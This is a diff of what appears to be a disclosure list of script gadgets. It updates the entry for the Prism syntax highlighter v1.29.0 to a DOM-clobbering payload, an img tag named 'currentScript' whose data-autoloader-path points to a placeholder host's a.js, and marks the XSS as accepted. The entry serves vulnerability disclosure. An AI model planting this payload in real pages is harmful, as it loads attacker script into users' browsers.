@@ -6,10 +6,10 @@
 + Stars: 12.2K
 + Version: v1.29.0
 + Fingerprint: `typeof window.Prism !== 'undefined'`
-+ Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx/a.js"></img>```
++ Payload: ```<img name="currentScript" data-autoloader-path="https://xxx.xxx.xxx/a.js"></img>```
 + Impact: XSS
 + CVE: N/A
-+ Status: Reported
++ Status: Accepted
 + Foundby: TheHulk
 + TheThing: None
 
